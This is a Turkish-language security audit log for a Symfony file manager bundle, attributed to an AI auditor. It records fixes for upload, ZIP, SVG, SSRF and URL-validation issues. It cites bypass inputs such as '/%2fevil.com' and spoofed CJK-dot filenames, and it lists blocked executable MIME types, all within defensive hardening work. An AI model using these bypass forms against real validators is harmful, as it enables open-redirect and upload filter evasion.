- [x] **P10-07 [ORTA GÜVENLİK & EŞZAMANLILIK] `UploadManager` Kullanıcı Bazlı Chunk Kotası & Atomik `.tmp` Yazımı ve `ImageEditorController` Çıkış Boyut/Temizlik Koruması**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Controller/ImageEditorController.php`
  - **Bulgu:** Chunk klasörleri kullanıcı bazlı izole edilmiyor, parçalar atomik yazılmıyor ve `.part_` dışı artık dosyalar boyuta karışabiliyordu; `ImageEditorController` yeniden kodlanan görselde `upload_max_size` sınırını tekrar doğrulamıyor ve geçici dosyayı `finally` içinde silmiyordu.
  - **Yapılan Değişiklik:** `liveux_fm_chunks/<userHash>/<scopedId>` dizini (`20`/`150` oturum limiti), atomik `.tmp`+`rename` ve kilitli temizlik eklendi; `ImageEditorController` çıktı boyutu sınırını, `finally` silmesini ve 100-deneme + rastgele hex yedeğini ekledi.

- [x] **P10-08 [ORTA GÜVENLİK] `ZipArchiveService::expandPathsForZip()` Sınırsız Ağaç Taraması, `EXTRACT_ZIP`/`DOWNLOAD_ZIP` Kontrolleri ve `$dirTarget` Dosya Çarpışması**
  - **Dosya:** `src/Service/ZipArchiveService.php`
  - **Bulgu:** ZIP oluşturmada alt klasör öğeleri `DOWNLOAD_ZIP` iznini tutarlı doğrulamıyor ve yineleme sınırı bulunmuyordu; ZIP açmada hedef dosya/klasör yollarında `VIEW`+`EXTRACT_ZIP` ve `$dirTarget` dosya çarpışma denetimi eksikti.
  - **Yapılan Değişiklik:** `MAX_SCAN_ITERATIONS = 50000`, derin `DOWNLOAD_ZIP`/`EXTRACT_ZIP` doğrulamaları ve `$filesystem->fileExists($dirTarget)` çarpışma engeli eklendi.

- [x] **P10-09 [YÜKSEK VERİ BÜTÜNLÜĞÜ & EŞZAMANLILIK] `FileOperationsService` Hardlink / Farklı İsim İnode Koruması ve Büyük-Küçük Harf Duyarsız Self-Move**
  - **Dosyalar:** `src/Service/FileOperationsService.php`, `src/Service/TrashManager.php`
  - **Bulgu:** `isSameLocalInodeRename()` farklı isimli iki dosya hardlink paylaşıyorsa üzerine yazmaya izin verebiliyordu; yerel farklı hacimler arası veya Windows/macOS'ta farklı harf büyüklüğünde klasörün kendi içine taşınması atlanabiliyordu; çöp kutusundan geri yüklemede üst klasör yolunda aynı isimli dosya varsa başarısız oluyordu.
  - **Yapılan Değişiklik:** `isSameLocalInodeRename()` ad eşitliği ön koşulu ve çapraz-hacim gerçek yol (`realpath`) kendi-içine taşıma denetimi eklendi; `TrashManager::restore()` üst yoldaki dosya çakışmasını (`errors.target_exists`) ve bozuk boş klasör meta kayıtlarını reddetti.

- [x] **P10-10 [YÜKSEK SQL ATOMİKLİĞİ & VERİTABANI UYUMLULUĞU] `DoctrineDbalMetadataStorage` Transaction İçi `SELECT`, PostgreSQL Prefix İndeks ve Boş Kayıt Kısa Devresi**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** `delete()`, `relocatePrefix()` ve `copyPrefix()` içindeki ön `SELECT` sorguları transaction dışındaydı ve silme listesi SQL placeholder limitini aşabiliyordu; `canonical_key(4096)` tam indeks tanımı PostgreSQL'de B-tree satır boyutu hatası üretebiliyordu; `preload()` içinde bellek eşiği döngü sonunda kontrol ediliyordu.
  - **Yapılan Değişiklik:** Tüm okuma/yazma transaction bloğuna alındı, 400 anahtarlık `deleteKeyHashesBatch()` eklendi, PostgreSQL için `LEFT(canonical_key, 191)` fonksiyonel indeks oluşturuldu, önbellekte boş bilinen anahtarlarda `save()` sıfır SQL yazımına indirildi.

- [x] **P10-11 [ALGORİTMA & TARAMA PERFORMANSI] `DirectoryLister` Dinamik URL & Tek Sefer `realpath()`, `StorageQuotaChecker` Sınırlı MinHeap, `ProfileFileScanner` Generator Akışı**
  - **Dosyalar:** `src/Service/DirectoryLister.php`, `src/Service/StorageQuotaChecker.php`, `src/Service/ProfileFileScanner.php`, `src/Command/{EnrichMetadata,OptimizeImages}Command.php`
  - **Bulgu:** `DirectoryLister::searchRecursive()` her dosya için `realpath()` ve `resolveLocalCreatedAt()` çağırıyordu; `StorageQuotaChecker` tüm dosyaları dizide tutup sıralıyordu (`O(N log N)`); `ProfileFileScanner::scanRasterImages()` tüm listeyi bellekte biriktiriyordu; `OptimizeImagesCommand` atlanan dosyalarda bile `--limit` sayacını artırıyordu.
  - **Yapılan Değişiklik:** `DirectoryLister` `realpath()`'ı önbelleğe alıp `resolveLocalCreatedAt()`'i yalnızca eşleşen öğelere erteledi; `StorageQuotaChecker` boyutu 48 ile sınırlı `\SplMinHeap` (`O(N log 48)`) kullandı; `ProfileFileScanner::iterateRasterImages()` generator'a çevrildi; `EnrichMetadataCommand` `metadata.enabled === false` profilleri atlayıp 250'şer batch preload yaptı.

- [x] **P10-12 [MEDYA & İKON GÜVENLİĞİ] `IconSetRegistry` `<svg:svg>` Önek Desteği + Sınırlar ve `ImageOptimizer::isAnimatedPng()` APNG Koruması**
  - **Dosyalar:** `src/Icon/IconSetRegistry.php`, `src/Service/ImageOptimizer.php`
  - **Bulgu:** Özel ikon `<svg:svg>` kök etiketi kullandığında öznitelik birleştirme regex'i kaçırabiliyordu; animasyonlu PNG (APNG `acTL`) optimize edildiğinde animasyon kareleri kaybolabiliyordu.
  - **Yapılan Değişiklik:** `IconSetRegistry` önekli SVG etiketlerini destekledi ve `256 KB` / `200` ek rozet sınırı koydu; `ImageOptimizer::isAnimatedPng()` `IDAT` öncesi `acTL` bloğunu tespit ederek kare kaybını önledi.

- [x] **P10-13 [FRONTEND PERFORMANS, BELLEK, YAŞAM DÖNGÜSÜ & RTL] `DialogController`, `BrowserController` ve `core.css` Sertleştirmesi**
  - **Dosyalar:** `assets/controllers/dialog_controller.js`, `assets/controllers/browser_controller.js`, `assets/styles/core.css`
  - **Bulgu:** `DialogController` eski `fetch()` yanıtları güncel diyaloğu ezebiliyordu; `BrowserController` `disconnect()` sonrası `enqueueFiles()`/`pumpUploadQueue()`/`fetchDirectory()` veya arka plan yükleme sonrası `trashMode` görünümünü bozabiliyordu; `<video>`/`<audio>` elemanlarının `src`/`<source>` bellekleri serbest bırakılmıyordu; `dirCache` sınırsız büyüyebiliyor ve `Intl.NumberFormat`/`DateTimeFormat` her hücrede yeniden oluşturuluyordu; bazı sayaç/boyut alanları RTL'de `dir="ltr"` ve yerelleştirilmiş sayı biçiminden yoksundu.
  - **Yapılan Değişiklik:** `DialogController` çifte `fetchController === controller` + `finally` koruması; `BrowserController` `isDisconnected`/`trashMode` muhafazaları, `releaseMediaElements()`, `setDirCache()` (`64` LRU sınırı), `_intlCache` + `_bcp47Cache` önbelleklemesi, RTL `dir="ltr"` + `formatNumber()` sayı yerelleştirmesi ve `core.css` BiDi izole seçicileri eklendi.

---

## 10. 11. Tur (Pass-11) — Önceki Rapor, Doküman ve Skill Tutarlılık Doğrulaması (`T11-01` – `T11-09`)

> **Doğrulamayı Yapan AI Model & Versiyon:** **Google Antigravity — Gemini 4 (Extra High Reasoning)**  
> **Denetim Tarihi:** `24.11.2026` | **Doğrulama:** `tests/Unit/Security/EleventhPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 15)

10. tur raporu (`T10-01` – `T10-14` ve `P10-01` – `P10-13`), dokümantasyonlar ve skill dosyaları canlı kodla satır satır çapraz kontrol edilerek aşağıdaki **9 tutarsızlık** tespit edilip düzeltilmiştir:

- [x] **T11-01 [DOKÜMANTASYON & SKILL HATASI] `T10-14` & `skills/liveux-file-manager-theming-and-icons/SKILL.md` — Yanlış Symfony Bundle Override Yolu (`LoaderError` Riski)**
  - **Dosyalar:** `skills/liveux-file-manager-theming-and-icons/SKILL.md`, `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`
  - **Tespit:** `FileManagerBundle::prependTwig()` `@LiveUXFileManager` ad alanını Symfony'nin bundle-override dizini yerine `twig.paths` ile kaydeder. Bu nedenle `SKILL.md` içinde verilen `templates/bundles/FileManagerBundle/` ve `@!LiveUXFileManager/...` kalıbı çalışmamakta ve Twig `LoaderError` fırlatmaktaydı.
  - **Düzeltme:** `SKILL.md` `ui.theme` üzerinden `@LiveUXFileManager/base/layout.html.twig` şablonunu genişleten özel layout şablonu (`docs/tr/04-temalar-ikon-setleri-ve-ozellestirme.md` ile uyumlu) yaklaşımına geçirildi ve rapor kaydı güncellendi.

- [x] **T11-02 [KOD TUTARSIZLIĞI] `ProfileConfig::getPermissionRule()` — `'extract_zip' => null` Kuralının `zip.allow_extract` Değerine Düşmemesi**
  - **Dosya:** `src/Config/ProfileConfig.php`
  - **Tespit:** `Configuration` ve `YamlConfigProvider` katmanları `extract_zip` açıkça tanımlanmadığında `zip.allow_extract` değerini miras alırken, doğrudan kurulan `ProfileConfig` nesnelerinde `'extract_zip' => null` verildiğinde `getPermissionRule('extract_zip')` `null` döndürüyordu.
  - **Düzeltme:** `getPermissionRule('extract_zip')` içinde değer `null` ise `(bool) ($this->zip['allow_extract'] ?? false)` değerine geri düşmesi sağlandı; açık rol kuralları (`'ROLE_ADMIN'`) ise korundu (`YamlConfigProvider.php` ile uyumlu).

- [x] **T11-03 [KOD TUTARSIZLIĞI] `SvgSanitizer` — Geçerli `<style><![CDATA[...]]></style>` Bloğunun Kaybolması & Fail-Closed CSS Kontrolü**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Tespit:** `P10-02` sonrası `shouldRemoveChild()` tüm `DOMCdataSection` düğümlerini düşürdüğü için, güvenli CDATA sarmallı `<style><![CDATA[.cls{fill:#2563eb}]]></style>` içeriği de siliniyordu; ayrıca regex hata durumları fail-open davranabiliyordu.
  - **Düzeltme:** `sanitizeStyleElement()` güvenli CSS doğrulandıktan sonra CDATA içeriğini düz `DOMText` düğümüne dönüştürdü ve `hasDangerousCss()` / `matchesDangerousCssTokens()` fail-closed (`!is_string` veya `preg_match !== 0`) yapıldı.

- [x] **T11-04 [KOD TUTARSIZLIĞI] `UnicodeHelper` — `truncateStemBytes()` Grapheme & Bölgesel Bayrak Sınırı ve Katı RFC 1123 Host Doğrulaması**
  - **Dosya:** `src/Util/UnicodeHelper.php`
  - **Tespit:** `truncateStemBytes()` çok-kodlu Devanagari, Emoji ZWJ ve Bölgesel Gösterge bayrak çiftlerini (`🇯🇵🇹🇷`) ortasından keserek bozuk veya tek kalan yarım bayrak üretebiliyordu; `canonicalizeHostToAscii()` köşeli parantezsiz IPv6 veya `%` içeren host kaçışlarını tutarsız ele alabiliyordu.
  - **Düzeltme:** `grapheme_extract(..., GRAPHEME_EXTR_MAXBYTES)` + artakalan ZWJ / tekil bayrak temizliği (`stripTrailingDanglingRegionalIndicator()`) ve sıkı RFC 1123 / parantezsiz IPv6 + `%` reddi eklendi.

- [x] **T11-05 [API & DOKÜMANTASYON TUTARSIZLIĞI] EasyAdmin `FileManagerField::setColorScheme()` ve `docs/tr/05` Seçenek Paritesi**
  - **Dosyalar:** `src/Bridge/EasyAdmin/FileManagerField.php`, `docs/tr/05-formtype-ve-editor-entegrasyonu.md`
  - **Tespit:** `FileManagerPickerType` `color_scheme` seçeneğini desteklerken EasyAdmin köprüsünde `setColorScheme()` metodu ve `docs/tr/05` FormType/değişken/EasyAdmin tablolarında `color_scheme` eksikti.
  - **Düzeltme:** `FileManagerField::setColorScheme(?string $colorScheme): self` eklendi ve `docs/tr/05` tamamen güncellendi.

- [x] **T11-06 [JS TUTARSIZLIĞI] `picker_controller.js::previewSrc()` — Üçüncü Taraf `/download` CDN URL'lerinin Bozulması**
  - **Dosya:** `assets/controllers/picker_controller.js`
  - **Tespit:** `basePart.endsWith('/download')` kontrolü `https://cdn.example.com/download?path=logo.svg` gibi üçüncü taraf CDN URL'lerini de `/thumb?...` yoluna çevirip görseli kırabiliyordu.
  - **Düzeltme:** Yeniden yazım yalnızca paket uç noktaları (`/_liveux-file-manager/download` veya kök `/download`) ile sınırlandırıldı.

- [x] **T11-07 [DOKÜMANTASYON] `CHANGELOG.md` `[Unreleased]` Güncellemesi**
  - **Dosya:** `CHANGELOG.md`
  - **Tespit:** `[Unreleased]` bölümü yalnızca 2. tur sertleştirmelerini anıyordu.
  - **Düzeltme:** 2–11. turların kapsamlı güvenlik, CVE, DBAL, MIME ve global Unicode sertleştirmelerini özetleyecek şekilde güncellendi.

- [x] **T11-08 [KOD TUTARSIZLIĞI] `ImageOptimizer` & `GdThumbnailDriver` — EXIF Yönü `5` ve `7` Açı Tersliği (`-90` ↔ `90`)**
  - **Dosyalar:** `src/Service/ImageOptimizer.php`, `src/Thumbnail/Driver/GdThumbnailDriver.php`
  - **Tespit:** PHP `imagerotate()` saat yönünün tersine (CCW) açı aldığı için `IMG_FLIP_HORIZONTAL` sonrasında EXIF `5` (`Transpose` → `+90`) ve `7` (`Transverse` → `-90`) dönüş açıları birbirinin tersiydi. Ayrıca `ImageOptimizer::autoOrientGd()` içine `applyExifOrientation()` ayrı private metod olarak çıkarılarak siklomatik karmaşıklık düşürüldü.
  - **Düzeltme:** Her iki sınıfta `6, 7 => -90` ve `5, 8 => 90` olarak düzeltildi; piksel koordinatlarıyla birim testte doğrulandı.

- [x] **T11-09 [KOD & PERFORMANS TUTARSIZLIĞI] `ApiController::tree()`, `trash()` & `TrashManager` Çift Eviction Çağrısı**
  - **Dosyalar:** `src/Controller/ApiController.php`, `src/Service/TrashManager.php`
  - **Tespit:** `ApiController::tree(full=1)` geçerli bir `$cleanPath` verildiğinde engelleniyordu; `trash()` içinde `canAttemptTrashScan()` ön kontrolü sonrası gereksiz `array_filter()` yapılıyordu; `TrashManager::assertBatchCanMoveToTrash()` FIFO eviction planlamasını aynı yığın için iki kez çalıştırıyordu.
  - **Düzeltme:** `tree(full=1)` yetkili alt yollarla uyumlu hale getirildi, `trash()` içindeki yinelenen filtreleme temizlendi ve `assertBatchCanMoveToTrash()` tek geçişe indirildi.

---

## 11. 11. Tur (Pass-11) — Kasım 2026 CVE Taraması ve Yeni Güvenlik, Eşzamanlılık, Performans ve Global Unicode Bulguları (`P11-01` – `P11-12`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** **Google Antigravity — Gemini 4 (Extra High Reasoning)**  
> **Doğrulama:** `tests/Unit/Security/EleventhPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 15)

### 11.1. Kasım 2026 İnternet CVE & `composer audit` Taraması
- **`CVE-2026-102601` (`league/flysystem < 3.35.3`):** Bundle `composer.json` içindeki alt sürüm kısıtı `^3.28` yerine **`^3.35.3`** düzeyine yükseltildi (yerelde kurulu sürüm: `3.36.0`).
- **`CVE-2026-118514` (`symfony/http-foundation` `HEAD` erişim kontrolü atlatması):** Yerelde kurulu sürüm `8.1.11` yamalı; ayrıca `config/routes.php` içindeki tüm HTTP yöntem kısıtları (`GET`/`POST`) doğrulandı.
- **`CVE-2026-45070` (`symfony/mime` MIME başlık enjeksiyonu):** Yerelde kurulu sürüm `8.1.10` yamalı; ek olarak controller başlıklarında katı sözdizimi doğrulaması mevcut.
- **Host Uygulama `composer audit` Uyarısı (`CVE-2026-133763` – `CVE-2026-133770`):** Host projedeki `twig/twig 3.31.0` ve `twig/html-extra 3.31.0` paketlerinde yeni yayımlanmış 8 Twig Sandbox güvenlik açığı tespit edildi (düzeltme sürümü: `3.31.1`). `FileManagerBundle` kendi içinde güvenilmeyen Twig Sandbox şablonları çalıştırmadığı için doğrudan etkilenmemekle birlikte, host uygulamanın `twig/twig` + `twig/html-extra` paketlerini `^3.31.1` sürümüne güncellemesi gerekir.

### 11.2. Tespit Edilen Bulgular ve Uygulanan Düzeltmeler

- [x] **P11-01 [KRİTİK BAĞIMLILIK & CVE] `composer.json` `league/flysystem` Sürüm Tabanı ve Genişletilmiş Aktif/Çalıştırılabilir MIME Engeli**
  - **Dosyalar:** `composer.json`, `src/Security/FileSecurityGuard.php`, `src/DependencyInjection/Configuration.php`
  - **Bulgu:** `league/flysystem ^3.28` sınırı `CVE-2026-102601` etkilenen sürümlerin kurulmasına izin veriyordu; ayrıca Python, Ruby, Perl, JSP, Tcl, CSH, WASM, JAR ve native executable MIME türlerinden bazıları `BLOCKED_ACTIVE_MIMES` veya varsayılan `upload_deny` listesinde eksikti.
  - **Yapılan Değişiklik:** `"league/flysystem": "^3.35.3"` alt sınırı tanımlandı ve 13 çalıştırılabilir/aktif MIME türü hem `FileSecurityGuard::BLOCKED_ACTIVE_MIMES` hem `Configuration` varsayılan `upload_deny` listesine eklendi.

- [x] **P11-02 [YÜKSEK GÜVENLİK — İNDİRME & PAYLAŞIM] `DownloadController` & `ShareController` `Content-Type` Ham Başlık Parametresi Enjeksiyonu Önlemi**
  - **Dosyalar:** `src/Controller/DownloadController.php`, `src/Controller/ShareController.php`
  - **Bulgu:** Doğrulanmış olsa da ham `$effectiveMime` değeri `Content-Type` başlığına parametreleriyle birlikte geçebiliyordu.
  - **Yapılan Değişiklik:** Çıkış `Content-Type` başlığı kesinleştirilmiş yalın `$lowerMime` (`text/plain` için yalnızca `'text/plain; charset=UTF-8'`) ile değiştirildi.

- [x] **P11-03 [YÜKSEK GÜVENLİK — PICKER & TWIG EXTENSION] Kodlanmış `/%2f`, `/%5c` URL Kaçışı ve CJK-Nokta Aktif Uzantı Gizleme Koruması**
  - **Dosyalar:** `src/Form/FileManagerPickerType.php`, `src/Twig/Extension/FileManagerTwigExtension.php`, `assets/controllers/{dialog,picker,browser}_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** `/%2fevil.com` veya `/%5cevil.com` biçimli önde slash taşıyan yollar URL doğrulamalarından geçebiliyor, `describeRelativePathFieldItem()` `.env`/`.trash` veya `"folder/test\u{3002}svg"` gibi CJK noktalı aktif belgeleri `hasSpoofedRelativeLeaf()` olmadan bağlayabiliyordu.
  - **Yapılan Değişiklik:** Tüm sunucu/istemci URL bekçilerinde `/^\/(?![\/\\]|%2[fF]|%5[cC])/` ve decode edilmiş `//` / `/\` reddi eklendi; `FileManagerTwigExtension` `.trash`/dotfile/`hasSpoofedRelativeLeaf()` kontrollerini zorunlu kıldı.

- [x] **P11-04 [YÜKSEK GÜVENLİK — CACHE & ÇOK KULLANICILI İZOLASYON] `AutoInjectDialogHostSubscriber` Genel CDN Önbellek Sızıntısı & Picker İşaretçi Kontrolü**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** Yalnızca varsayılan profile bakıldığı için başka bir profilde `voter_enabled: true` olsa dahi `Cache-Control: public` yanıtlarına enjeksiyon riski oluşabiliyordu; ayrıca diğer hacimler ve HTML içindeki `liveux--file-manager-bundle--picker` varlığı bütüncül denetlenmiyordu.
  - **Yapılan Değişiklik:** `hasAnyVoterProtectedProfile()` tüm profilleri denetledi, `isAuthorizedToInject()` birincil/diğer profillerin tüm hacimlerini ve picker DOM işaretçisini kapsadı.

- [x] **P11-05 [KRİTİK GÜVENLİK & EŞZAMANLILIK — TRASH & CACHE CLEAR] `FileSecurityGuard` Kanonik `.trash` Yolu, `TrashManager::moveToTrash()` Kapısı & `{user_id}` Thumbnail Temizliği**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/Service/TrashManager.php`, `src/Controller/ApiController.php`
  - **Bulgu:** `FileSecurityGuard::buildTrashComparisonPath()` ile kanonikleştirilmeyen tam genişlikli `.ＴＲＡＳＨ` kalıpları çöp dizini kontrolünü aşabiliyordu; `TrashManager::moveToTrash()` `isEnabled()` ve `assertNotTrashAncestor()` çağırmıyordu; `ApiController::handleClearCache()` `{user_id}` hacimli profillerde ve paylaşılan thumbnail dizinlerinde fail-closed davranmıyordu.
  - **Yapılan Değişiklik:** `buildTrashComparisonPath()` tüm çöp yolu kontrollerine bağlandı; `TrashManager::moveToTrash()` devre dışı profil ve `.trash` atasını reddetti; `ApiController` `{user_id}` hacim kapsamlı önbellek sıfırlama + paylaşılan dizin fail-closed `iterateRasterImages()` taramasına geçirildi.

- [x] **P11-06 [YÜKSEK SSRF — IPv6] `RemoteUrlImporter::isPublicIpv6()` SIIT, ORCHID, Benchmarking, Genişletilmiş Doc ve SRv6 Blokları**
  - **Dosya:** `src/Service/RemoteUrlImporter.php`
  - **Bulgu:** Kullanımdan kalkmış SIIT (`::ffff:0:0:0/96`), Benchmarking (`2001:2::/48`), ORCHID/ORCHIDv2 (`2001:10::/28`, `2001:20::/28`), RFC 9637 dokümantasyon (`3fff::/20`) ve Segment Routing (`5f00::/16`) önekleri filtrelenmiyordu.
  - **Yapılan Değişiklik:** Tüm bu özel IPv6 aralıkları `isPublicIpv6()` içinde engellendi.

- [x] **P11-07 [YÜKSEK ARŞİV & YÜKLEME GÜVENLİĞİ] `ZipArchiveService` Ata-Dosya Çarpışması, `U+2024`, Çıkış Boyut Sınırı, Çakışma Sınırı ve `UploadManager` `clearstatcache()`**
  - **Dosyalar:** `src/Service/ZipArchiveService.php`, `src/Service/UploadManager.php`
  - **Bulgu:** Arşiv içindeki `subfile/payload.txt` girişi hedefte `subfile` adında normal bir dosya varken anlamlı hata yerine Flysystem/OS hatasına düşebiliyordu; `U+2024` nokta lideri ve Windows ayrılmış arşiv kök adları (`CON.zip`) sınırlanmıyordu; görüntü optimizasyonu sonrası dosya boyutu `upload_max_size` / toplam arşiv sınırını aşabiliyor ve `UploadManager` eski stat önbelleği okuyabiliyordu.
  - **Yapılan Değişiklik:** `assertNoAncestorFileCollision()`, `U+2024` temizliği, post-optimizasyon tekil/kümülatif boyut denetimi, `<= 100` + hex çarpışma sınırı, `resolveExtractDestination()` `CON.zip -> extracted-<hash>` yedeği, akışlı ZIP boyutu muhasebesi ve `UploadManager` `clearstatcache(true, ...)` + optimizasyon sonrası limit kontrolü eklendi.

- [x] **P11-08 [YÜKSEK VERİTABANI — DBAL] `DoctrineDbalMetadataStorage::relocatePrefix()` & `copyPrefix()` Eski NFD/NFC Çarpışması**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** Aynı önek altında hem eski bir NFD kayıt hem de güncel NFC kayıt varsa toplu ekleme aşamasında `key_hash` birincil anahtar çakışması oluşabiliyordu.
  - **Yapılan Değişiklik:** Ekleme haritası hedef hash (`$newHash` / `$dstHash`) üzerinden tekilleştirildi ve güncel NFC satıra öncelik (`_isExactNfc`) verildi.

- [x] **P11-09 [ORTA GLOBAL UNICODE — METADATA] `FolderMetadata` Kesme Sonrası Kenar ZWNJ/ZWJ & Grapheme Koruması**
  - **Dosya:** `src/Metadata/FolderMetadata.php`
  - **Bulgu:** 40/max karakter kesmesi (`mb_substr`) bir Farsça/İndik kelimenin ya da emoji dizisinin ortasından kesip dize sonunda sahipsiz `U+200C`/`U+200D` bırakabiliyordu.
  - **Yapılan Değişiklik:** `truncateAndCleanInvisibleEdges()` yardımcısı (`grapheme_substr` + kenar ZWNJ/ZWJ temizliği) hem `sanitizeText()` hem `sanitizeTags()` için uygulandı.

- [x] **P11-10 [PERFORMANS & CACHE DOĞRULUĞU] `DirectoryCacheManager` `$sharedGroupKey`, `invalidateVolume()`, CLI `iterateRasterImages()` ve `OptimizeImagesCommand`**
  - **Dosyalar:** `src/Service/DirectoryCacheManager.php`, `src/Service/DirectoryLister.php`, `src/Command/{OptimizeImages,ThumbnailWarmup,ThumbnailClear}Command.php`, `src/Service/FileOperationsService.php`
  - **Bulgu:** Özel derinlikli ağaç önbellekleri (`__tree_v2___d2`) temel ağaç anahtarı geçersiz kılındığında güncel kalabiliyordu; `invalidateVolume()` alt-klasör köklerini `resolveVolumeScopeForRoot()` üzerinden çözmüyordu; `ThumbnailWarmupCommand` ve `ThumbnailClearCommand` tüm görselleri bellek dizisine çekiyordu; `OptimizeImagesCommand` hacim yerine tüm profili siliyordu.
  - **Yapılan Değişiklik:** `DirectoryCacheManager::remember()` `$sharedGroupKey` parametresi (hem TagAware hem Generation havuzu) ve `resolveVolumeScopeForRoot()` entegrasyonu, `DirectoryLister::loadCachedRawTree()` grup bağlaması, CLI komutlarında `iterateRasterImages()` akışı, hacim kapsamlı geçersiz kılma ve `FileOperationsService` macOS Darwin/`noOp` sırası eklendi.

- [x] **P11-11 [FRONTEND YAŞAM DÖNGÜSÜ, RTL & ERİŞİLEBİLİRLİK] `BrowserController`, `DialogController`, Editör Adaptörleri, Twig & `core.css`**
  - **Dosyalar:** `assets/controllers/{browser,dialog,picker}_controller.js`, `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`, `templates/base/parts/{_topbar,_sidebar}.html.twig`, `assets/styles/core.css`
  - **Bulgu:** `BrowserController` `refreshFullTree()`, `fetchTrash()`, `toBlob()` ve chunk upload dönüşlerinde `isDisconnected` / `X-Requested-With` koruması eksikti; `hasUnsafeSvgCss()` `data:` engelinde `DialogController` ile senkron değildi; `isRtlLocale()` pek çok global LTR yazı sistemini tanımıyordu ve `foldSearch()` Almanca `ß`/`ẞ` katlaması yapmıyordu; `_topbar.html.twig` spinner `aria-live` ve `_sidebar.html.twig` ok simgesi `aria-hidden` özniteliklerinden yoksundu; `core.css` `[data-page-jump-input]` BiDi izolasyonundan yoksundu.
  - **Yapılan Değişiklik:** Tüm controller/adaptör korumaları, global script setleri, Almanca `ß -> ss` katlaması, erişilebilir Twig öznitelikleri ve RTL BiDi CSS kuralları uygulanıp JS Test 15 ile doğrulandı.

- [x] **P11-12 [RAPOR ARŞİV BÜTÜNLÜĞÜ] Süreklilik Kaydı & Test Paketi Ayrışması Doğrulaması**
  - **Dosyalar:** `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`, `docs/tr/README.md`, `tests/Unit/Security/EleventhPassGlobalSecurityAuditTest.php`
  - **Yapılan Değişiklik:** Önceki 10 güvenlik/regresyon paketi dahil tüm `50` PHP test dosyası ve `2` JS test süitinin birbirinden tamamen farklı, kümülatif katmanları test ettiği doğrulandı; 11. tur regresyonları için `14` yeni PHP testi ve `1` kapsamlı JS test bloğu (Test 15) eklendi.

---

## 12. 12. Tur (Pass-12) — Önceki Düzeltmelerin ve Doküman/Skill Tutarsızlıklarının Doğrulaması (`T12-01` – `T12-09`)

> **Denetim Tarihi:** `24.11.2026` | **Denetçi Model:** **Google Antigravity — Gemini 4 (Extra High Reasoning)**  
> **Doğrulama:** `tests/Unit/Security/TwelfthPassGlobalSecurityAuditTest.php`, `tests/Unit/Security/EleventhPassGlobalSecurityAuditTest.php`, `tests/Js/frontend_audit_test.mjs` (Test 16)

12. turda önce `14-guvenlik-denetim-ve-degisiklik-raporu.md` maddeleri, `docs/tr/*`, `skills/*` ve önceki regresyon testleri kod ile birebir karşılaştırıldı. Aşağıdaki **9 tutarsızlık** yakalanıp düzeltildi:

- [x] **T12-01 [RAPOR METNİ] `T11-08` İfade Temizliği**
  - **Dosya:** `docs/tr/14-guvenlik-denetim-ve-degisiklik-raporu.md`
  - **Tespit:** `T11-08` açıklaması içinde parantez içi taslak soru/dikkat ifadesi kalmıştı.
  - **Düzeltme:** Net teknik açıklama olarak yeniden yazıldı.

- [x] **T12-02 [ÇEVİRİ EKSİĞİ] `errors.zip_extract_too_large` Anahtarı (`en`, `tr`, `fr`)**
  - **Dosyalar:** `translations/LiveUXFileManagerBundle.{en,tr,fr}.yaml`, `src/Service/ZipArchiveService.php`
  - **Tespit:** `ZipArchiveService` `errors.zip_extract_too_large` anahtarını kullanmasına karşın çeviri kataloglarında eksikti; post-optimizasyon yükleme hatasında ise `errors.upload_too_large` yerine yanlış anahtar/parametre kullanılıyordu.
  - **Düzeltme:** Üç dil dosyası `489` anahtarla eşitlendi ve `UploadManager` + `ZipArchiveService` post-optimizasyon limiti `errors.upload_too_large` (`%name%`, `%max%`) ile hizalandı.

- [x] **T12-03 [DOKÜMAN & SKILL SENKRONİZASYONU] Varsayılan `upload_deny` Sayısı & `exclude_patterns` Case-Insensitive Bayrağı**
  - **Dosyalar:** `docs/tr/02-yapilandirma-ve-profiller.md`, `skills/liveux-file-manager-setup/references/config-schema.md`, `src/DependencyInjection/Configuration.php`
  - **Tespit:** Doküman/skill şeması varsayılan `upload_deny` listesini "12 tür" ve `exclude_patterns` varsayılanını büyük/küçük harf duyarlı `/^_thumbs$/` olarak gösteriyordu; oysa `Configuration` 44 MIME tipi tanımlıyor ve `_THUMBS` / `.ds_store` bypass riski taşıyordu.
  - **Düzeltme:** `Configuration` varsayılanı `['/^_thumbs$/i', '/^\.DS_Store$/i']` olarak güncellendi; `docs/tr/02` ve `config-schema.md` 44 varsayılan MIME tipi, yeni `exclude_patterns`, Voter-aware `show_folder_item_count` ve `cache.enabled` önceliğiyle senkronlandı.

- [x] **T12-04 [JS UÇ NOKTA REWRITE] `picker_controller.js::previewSrc()` Özel Route Öneki ve Üçüncü Taraf Origin Koruması**
  - **Dosya:** `assets/controllers/picker_controller.js`
  - **Tespit:** Özel `/media/fm/download` öneklerinde `thumbUrlValue` (`/media/fm/thumb`) türetmesi eksikti; ilk düzeltmede Node/SSR ortamında `window.location.origin` olmadığından üçüncü taraf `/download` URL'leri yanlışlıkla `/thumb`'a dönebiliyordu.
  - **Düzeltme:** `configuredThumbBase`'ten beklenen `/download` öneki yalnızca aynı-origin veya kök-göreceli URL'ler için eşleştirildi; üçüncü taraf CDN `/download` URL'leri kesinlikle dokunulmadan bırakıldı.

- [x] **T12-05 [TEST FİKSTÜR TUTARSIZLIĞI] `EleventhPassGlobalSecurityAuditTest` Anahtar Adları ve NFD/NFC Önek Testi**
  - **Dosya:** `tests/Unit/Security/EleventhPassGlobalSecurityAuditTest.php`
